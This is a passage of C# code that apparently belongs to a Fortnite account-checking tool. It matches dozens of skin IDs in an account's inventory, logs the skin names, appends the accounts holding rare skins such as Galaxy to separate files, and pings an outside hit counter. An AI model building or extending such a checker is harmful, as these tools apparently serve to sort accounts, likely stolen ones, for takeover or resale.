                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag81 = x.Contains("AthenaCharacter:cid_150_athena_commando_f_soccergirlc");
                            if (flag81)
                            {
                                sw.WriteLine("=> Soccer Girl C");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Soccer Girl C");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag82 = x.Contains("AthenaCharacter:cid_039_athena_commando_f_disco");
                            if (flag82)
                            {
                                sw.WriteLine("=> Sparkle Specialist");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sparkle Specialist");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag83 = x.Contains("AthenaCharacter:cid_020_athena_commando_m");
                            if (flag83)
                            {
                                sw.WriteLine("=> Special Forces");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Special Forces");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag84 = x.Contains("AthenaCharacter:cid_117_athena_commando_m_tacticaljungle");
                            if (flag84)
                            {
                                sw.WriteLine("=> Squad Leader");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Squad Leader");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag85 = x.Contains("AthenaCharacter:cid_085_athena_commando_m_twitch");
                            if (flag85)
                            {
                                sw.WriteLine("=> Sub Commander");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sub Commander");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag86 = x.Contains("AthenaCharacter:cid_027_athena_commando_f");
                            if (flag86)
                            {
                                sw.WriteLine("=> Survival Specialist");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Survival Specialist");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag87 = x.Contains("AthenaCharacter:cid_120_athena_commando_f_graffiti");
                            if (flag87)
                            {
                                sw.WriteLine("=> Teknique");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Teknique");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag88 = x.Contains("AthenaCharacter:cid_084_athena_commando_m_assassin");
                            if (flag88)
                            {
                                sw.WriteLine("=> The Reaper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> The Reaper");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag89 = x.Contains("AthenaCharacter:cid_140_athena_commando_m_visitor");
                            if (flag89)
                            {
                                sw.WriteLine("=> The Visitor");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> The Visitor");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag90 = x.Contains("AthenaCharacter:cid_109_athena_commando_m_pizza");
                            if (flag90)
                            {
                                sw.WriteLine("=> Tomato Head");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tomato Head");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag91 = x.Contains("AthenaCharacter:cid_127_athena_commando_m_hazmat");
                            if (flag91)
                            {
                                sw.WriteLine("=> Toxic Trooper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Toxic Trooper");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag92 = x.Contains("AthenaCharacter:cid_114_athena_commando_f_tacticalwoodland");
                            if (flag92)
                            {
                                sw.WriteLine("=> Trailblazer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Trailblazer");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag93 = x.Contains("cid_009_athena_commando_m");
                            if (flag93)
                            {
                                sw.WriteLine("=> Tracker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tracker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag94 = x.Contains("AthenaCharacter:cid_107_athena_commando_f_pajamaparty");
                            if (flag94)
                            {
                                sw.WriteLine("=> Tricera Ops");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tricera Ops");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag95 = x.Contains("AthenaCharacter:cid_137_athena_commando_f_basketball");
                            if (flag95)
                            {
                                sw.WriteLine("=> Triple Threat");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Triple Threat");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag96 = x.Contains("AthenaCharacter:cid_012_athena_commando_m");
                            if (flag96)
                            {
                                sw.WriteLine("=> Trooper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Trooper");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag97 = x.Contains("AthenaCharacter:cid_118_athena_commando_f_valor");
                            if (flag97)
                            {
                                sw.WriteLine("=> Valor");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Valor");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag98 = x.Contains("AthenaCharacter:cid_133_athena_commando_f_deco");
                            if (flag98)
                            {
                                sw.WriteLine("=> Ventura");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ventura");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag99 = x.Contains("AthenaCharacter:cid_129_athena_commando_m_deco");
                            if (flag99)
                            {
                                sw.WriteLine("=> Venturion");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Venturion");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag100 = x.Contains("cid_160_athena_commando_m_speedyred");
                            if (flag100)
                            {
                                sw.WriteLine("=> Vertex");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Vertex");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag101 = x.Contains("AthenaCharacter:cid_106_athena_commando_f_taxi");
                            if (flag101)
                            {
                                sw.WriteLine("=> Whiplash");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Whiplash");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag102 = x.Contains("AthenaCharacter:cid_139_athena_commando_m_fighterpilot");
                            if (flag102)
                            {
                                sw.WriteLine("=> Wingman");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wingman");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag103 = x.Contains("AthenaCharacter:cid_071_athena_commando_m_wukong");
                            if (flag103)
                            {
                                sw.WriteLine("=> Wukong");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wukong");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag104 = x.Contains("AthenaCharacter:cid_045_athena_commando_m_holidaysweater");
                            if (flag104)
                            {
                                sw.WriteLine("=> Yuletide Ranger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Yuletide Ranger");
                                }
                                if (YuletideRangerSaveFile.Checked)
                                {
                                    using (StreamWriter YuletideRangerBoi = File.AppendText(YuletideRanger))
                                    {
                                        YuletideRangerBoi.WriteLine(account);
                                    }
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag105 = x.Contains("AthenaCharacter:cid_119_athena_commando_f_candy");
                            if (flag105)
                            {
                                sw.WriteLine("=> Zoey");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Zoey");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag151 = x.Contains("AthenaCharacter:cid_095_athena_commando_m_founder");
                            if (flag151)
                            {
                                sw.WriteLine("=> Warpaint");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Warpaint");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag152 = x.Contains("AthenaCharacter:cid_096_athena_commando_f_founder");
                            if (flag152)
                            {
                                sw.WriteLine("=> Rose Team Leader");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rose Team Leader");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag161 = x.Contains("AthenaCharacter:cid_166_athena_commando_f_lifeguard");
                            if (flag161)
                            {
                                sw.WriteLine("=> Sun Strider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sun Strider");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag162 = x.Contains("AthenaCharacter:cid_161_athena_commando_m_drift");
                            if (flag162)
                            {
                                sw.WriteLine("=> Drift");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Drift");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag163 = x.Contains("AthenaCharacter:cid_162_athena_commando_f_streetracer");
                            if (flag163)
                            {
                                sw.WriteLine("=> Redline");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Redline");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag164 = x.Contains("AthenaCharacter:cid_168_athena_commando_m_shark");
                            if (flag164)
                            {
                                sw.WriteLine("=> Chomp Sr.");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Chomp Sr.");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag165 = x.Contains("AthenaCharacter:cid_163_athena_commando_f_viking");
                            if (flag165)
                            {
                                sw.WriteLine("=> Huntress");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Huntress");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag166 = x.Contains("AthenaCharacter:cid_167_athena_commando_m_tacticalbadass");
                            if (flag166)
                            {
                                sw.WriteLine("=> Sledgehammer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sledgehammer");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag167 = x.Contains("AthenaCharacter:cid_173_athena_commando_f_starfishuniform");
                            if (flag167)
                            {
                                sw.WriteLine("=> Rook");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rook");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag168 = x.Contains("AthenaCharacter:cid_165_athena_commando_m_darkviking");
                            if (flag168)
                            {
                                sw.WriteLine("=> Ragnarok");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ragnarok");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck1 = x.Contains("AthenaCharacter:cid_113_athena_commando_m_blueace");
                            if (NewSkinsCheck1)
                            {
                                sw.WriteLine("=> Royale Bomber");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Royale Bomber");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                if (RoyaleBomberSaveFile.Checked)
                                {
                                    using (StreamWriter RoyaleBombS = File.AppendText(Royalebomber))
                                    {
                                        RoyaleBombS.WriteLine(account);
                                    }
                                }
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck2 = x.Contains("AthenaCharacter:cid_122_athena_commando_m_metal");
                            if (NewSkinsCheck2)
                            {
                                sw.WriteLine("=> Diecast");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Diecast");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck3 = x.Contains("AthenaCharacter:cid_128_athena_commando_f_hazmat");
                            if (NewSkinsCheck3)
                            {
                                sw.WriteLine("=> Hazard Agent");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hazard Agent");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck4 = x.Contains("AthenaCharacter:cid_130_athena_commando_m_merman");
                            if (NewSkinsCheck4)
                            {
                                sw.WriteLine("=> Moisty Merman");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Moisty Merman");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck5 = x.Contains("AthenaCharacter:cid_131_athena_commando_m_warpaint");
                            if (NewSkinsCheck5)
                            {
                                sw.WriteLine("=> Bandolier");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bandolier");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck6 = x.Contains("AthenaCharacter:cid_136_athena_commando_m_basketball");
                            if (NewSkinsCheck6)
                            {
                                sw.WriteLine("=> Jumpshot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jumpshot");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck7 = x.Contains("AthenaCharacter:cid_144_athena_commando_m_soccerdudea");
                            if (NewSkinsCheck7)
                            {
                                sw.WriteLine("=> Super Striker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Super Striker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck8 = x.Contains("AthenaCharacter:cid_145_athena_commando_m_soccerdudeb");
                            if (NewSkinsCheck8)
                            {
                                sw.WriteLine("=> Midfield Maestro");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Midfield Maestro");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck9 = x.Contains("AthenaCharacter:cid_146_athena_commando_m_soccerdudec");
                            if (NewSkinsCheck9)
                            {
                                sw.WriteLine("=> Aerial Threat");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Aerial Threat");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck10 = x.Contains("AthenaCharacter:cid_147_athena_commando_m_soccerduded");
                            if (NewSkinsCheck10)
                            {
                                sw.WriteLine("=> Stalwart Sweeper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Stalwart Sweeper");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck11 = x.Contains("AthenaCharacter:cid_148_athena_commando_f_soccergirla");
                            if (NewSkinsCheck11)
                            {
                                sw.WriteLine("=> Dynamic Dribbler");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dynamic Dribbler");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck12 = x.Contains("AthenaCharacter:cid_149_athena_commando_f_soccergirlb");
                            if (NewSkinsCheck12)
                            {
                                sw.WriteLine("=> Poised Playmaker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Poised Playmaker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck13 = x.Contains("AthenaCharacter:cid_150_athena_commando_f_soccergirlc");
                            if (NewSkinsCheck13)
                            {
                                sw.WriteLine("=> Finesse Finisher");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Finesse Finisher");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck14 = x.Contains("AthenaCharacter:cid_151_athena_commando_f_soccergirld");
                            if (NewSkinsCheck14)
                            {
                                sw.WriteLine("=> Clinical Crosser");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Clinical Crosser");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck15 = x.Contains("AthenaCharacter:cid_152_athena_commando_f_carbideorange");
                            if (NewSkinsCheck15)
                            {
                                sw.WriteLine("=> Criterion");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Criterion");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck16 = x.Contains("AthenaCharacter:cid_153_athena_commando_f_carbideblack");
                            if (NewSkinsCheck16)
                            {
                                sw.WriteLine("=> Oblivion");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Oblivion");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck17 = x.Contains("AthenaCharacter:cid_154_athena_commando_m_gumshoe");
                            if (NewSkinsCheck17)
                            {
                                sw.WriteLine("=> Sleuth");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sleuth");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck18 = x.Contains("AthenaCharacter:cid_156_athena_commando_f_fuzzybearind");
                            if (NewSkinsCheck18)
                            {
                                sw.WriteLine("=> Fireworks Team Leader");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fireworks Team Leader");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck19 = x.Contains("AthenaCharacter:cid_157_athena_commando_m_starsandstripes");
                            if (NewSkinsCheck19)
                            {
                                sw.WriteLine("=> Star-Spangled Trooper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Star-Spangled Trooper");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck20 = x.Contains("AthenaCharacter:cid_158_athena_commando_f_starsandstripes");
                            if (NewSkinsCheck20)
                            {
                                sw.WriteLine("=> Star-Spangled Ranger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Star-Spangled Ranger");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck21 = x.Contains("AthenaCharacter:cid_164_athena_commando_m_viking");
                            if (NewSkinsCheck21)
                            {
                                sw.WriteLine("=> Magnus");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Magnus");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck22 = x.Contains("AthenaCharacter:cid_169_athena_commando_m_luchador");
                            if (NewSkinsCheck22)
                            {
                                sw.WriteLine("=> Masked Fury");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Masked Fury");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck23 = x.Contains("AthenaCharacter:cid_170_athena_commando_f_luchador");
                            if (NewSkinsCheck23)
                            {
                                sw.WriteLine("=> Dynamo");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dynamo");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck24 = x.Contains("AthenaCharacter:cid_171_athena_commando_m_sharpdresser");
                            if (NewSkinsCheck24)
                            {
                                sw.WriteLine("=> Moniker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Moniker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck25 = x.Contains("AthenaCharacter:cid_172_athena_commando_f_sharpdresser");
                            if (NewSkinsCheck25)
                            {
                                sw.WriteLine("=> Fortune");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fortune");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck26 = x.Contains("AthenaCharacter:cid_176_athena_commando_m_lifeguard");
                            if (NewSkinsCheck26)
                            {
                                sw.WriteLine("=> Sun Tan Specialist");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sun Tan Specialist");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck27 = x.Contains("AthenaCharacter:cid_177_athena_commando_m_streetracercobra");
                            if (NewSkinsCheck27)
                            {
                                sw.WriteLine("=> Maverick");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Maverick");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck28 = x.Contains("AthenaCharacter:cid_178_athena_commando_f_streetracercobra");
                            if (NewSkinsCheck28)
                            {
                                sw.WriteLine("=> Shade");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shade");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck29 = x.Contains("AthenaCharacter:cid_179_athena_commando_f_scuba");
                            if (NewSkinsCheck29)
                            {
                                sw.WriteLine("=> Reef Ranger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Reef Ranger");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck30 = x.Contains("AthenaCharacter:cid_180_athena_commando_m_scuba");
                            if (NewSkinsCheck30)
                            {
                                sw.WriteLine("=> Wreck Raider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wreck Raider");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck31 = x.Contains("AthenaCharacter:cid_182_athena_commando_m_modernmilitary");
                            if (NewSkinsCheck31)
                            {
                                sw.WriteLine("=> Archetype");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Archetype");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck32 = x.Contains("AthenaCharacter:cid_175_athena_commando_m_celestial");
                            if (NewSkinsCheck32)
                            {
                                sw.WriteLine("=> Galaxy");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Galaxy");
                                }
                                using (StreamWriter FoundGalaxySkins = File.AppendText(GalaxySkinFound))
                                {
                                    FoundGalaxySkins.WriteLine(account);
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                Interlocked.Increment(ref TotalGalaxyChecked);
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=116517455&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck33 = x.Contains("AthenaCharacter:cid_185_athena_commando_m_durrburgerhero");
                            if (NewSkinsCheck33)
                            {
                                sw.WriteLine("=> Beef Boss");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Beef Boss");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck34 = x.Contains("AthenaCharacter:cid_186_athena_commando_m_exercise");
                            if (NewSkinsCheck34)
                            {
                                sw.WriteLine("=> Mullet Marauder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mullet Marauder");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck35 = x.Contains("AthenaCharacter:cid_187_athena_commando_f_fuzzybearpanda");
                            if (NewSkinsCheck35)
                            {
                                sw.WriteLine("=> P.a.n.d.a Team Leader");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> P.a.n.d.a Team Leader");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck36 = x.Contains("AthenaCharacter:cid_188_athena_commando_f_streetracerwhite");
                            if (NewSkinsCheck36)
                            {
                                sw.WriteLine("=> Whiteout");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Whiteout");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck37 = x.Contains("AthenaCharacter:cid_189_athena_commando_f_exercise");
                            if (NewSkinsCheck37)
                            {
                                sw.WriteLine("=> Aerobic Assassin");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Aerobic Assassin");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck38 = x.Contains("AthenaCharacter:cid_190_athena_commando_m_streetracerwhite");
                            if (NewSkinsCheck38)
                            {
                                sw.WriteLine("=> Overtaker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Overtaker");
                                }
